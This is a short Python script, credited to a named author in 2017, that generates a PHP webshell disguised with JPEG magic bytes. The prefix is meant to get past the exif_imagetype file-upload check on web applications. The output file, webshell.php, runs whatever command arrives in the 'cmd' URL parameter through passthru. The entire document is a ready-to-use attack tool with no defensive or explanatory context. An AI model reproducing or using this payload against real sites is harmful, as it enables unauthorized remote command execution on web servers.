# Script Name		: shellImage.py
# Author				: Alessandra Zullo
# Created				: Ottobre 2017
# Last Modified		: null
# Version				: 0.1


# Description			: Create a webshell (php) that bypass exif_imagetype function that checks the type of upload's file.
fh = open('webshell.php', 'w')
fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
fh.close()
